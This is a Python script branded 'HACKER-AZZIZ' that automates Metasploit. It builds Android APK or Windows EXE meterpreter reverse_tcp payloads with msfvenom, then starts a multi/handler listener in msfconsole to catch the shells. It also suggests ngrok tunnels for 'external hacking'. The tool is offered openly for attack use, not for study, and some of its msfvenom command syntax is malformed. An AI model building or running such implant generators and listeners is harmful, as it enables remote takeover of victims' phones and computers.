import os
import time
pink='\033[95m'
bold='\033[01m'
red='\033[31m'
orange='\033[33m'
a="""
                           -------------------
                           \                 /
                            \ HACKER-AZZIZ  /
                             \             /
                              -------------
                              fake ala-haji
"""
print(a)
n=10
for i in range (n):
     print(i,"Stay Anonymous")
b=("                          I'm Anonymous                            ")
print(b)
c=(" Follow me in Fasebook Azz Iz ")
print(c)
print("""
                           -------------
                           ----My Love--
                          //////azziz/////
                          Ise ngrok  for external hacking
                          sudo ngrok tcp [port in 4 number]
""")

print("""
*****************************************************************************
++++++++++++++++++++++++++++++ Start service ++++++++++++++++++++++++++++++++
*****************************************************************************
""")

def apache2():
    print("[+]"+"starting apache2 server")
    time.sleep(2)
    os.system("sudo service apache2 start")
apache2()
def postgresql():
    print("[+]starting postgresql server")
    time.sleep(2)
    os.system("sudo service postgresql start")
postgresql()
def payload():
    global y
    #y=True
   # n=False
  #  pay1=str(input("Generate a payload android (y) or (n): "))
 #   while pay1=True:
#                   print("succes")
    #else :
        # print("false")
#    aa=str(input("Name of payload")
    print(pink +"""
    1)Generate payload Android
    2)Generate payload Windows
    3)exit
     """)
    chose=int(input(red + "root@May~#"))
    y=0
    if chose == 1:
       y=1
       host=str(input(orange +"enter LHOST="))
       lport=str(input("enter LPORT="))
       name=str(input("Name of app .apk : " ))
       print("[+]Generate a payload for android")
       time.sleep(15)
       os.system("msfvenom -p android/meterpreter/reverse_tcp set LHOST=%s set LPORT=%s -o %s " % (host, lport, name))
       print("[+]Payload saved in shadow/%s " % (name))
    elif chose == 2:
          host=str(input(orange +"enter LHOST="))
          lport=str(input("enter LPORT="))
          name=str(input("Name of payload .exe : " ))
          print("[+]Generate a payload for windows")
          time.sleep(10)
          os.system("msfvenom -p windows/meterpreter/reverse_tcp set LHOST=%s set LPORT=%s -o %s " % (host, lport, name))
          print("[+]Payload saved in shadow/%s " % (name))
          pay=("windows/meterpreter/reverse_tcp")
    else:
         exit()
payload()
def Metasploit():
     lhost=str(input("enter 2éme HOST ="))
     lport=str(input("enter 2éme PORT="))
     print("Run this coomand on Metasploit :")
     if y==1 :
        print("[1] use exploit/multi/handler")
        print("[2] set payload android/meterpreter/reverse_tcp")
        print("[3] set LHOST %s " % (lhost))
        print("[4] set LPORT %s " % (lport))
        print("[5] exploit")
     else:
         print("[1] use exploit/multi/handler")
         print("[2] set payload windows/meterpreter/reverse_tcp")
         print("[3] set LHOST %s " % (lhost))
         print("[4] set LPORT %s " % (lport))
         print("[5] exploit")

     multihandler = input("Do You want to start Metasploit Now (yes)or(no):")
     if multihandler == "yes":
         if y==1 :
             print("[+]start Metasploit Framwork")
             time.sleep(2)
             os.system("msfconsole -q -x 'use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit'" % (lhost, lport))
         else:
             print("[+]start Metasploit Framwork")
             time.sleep(2)
             os.system("msfconsole -q -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit'" %(lhost, lport))
     else:
          exit()
    # os.system("use exploit/multi/handler")
   #  os.system("set payload android/meterpreter/reverse_tcp")
  #   os.system("set LHOST %s " % (lhost))
 #    os.system("set LPORT %s " % (lport))
#     os.system("exploit")
Metasploit()
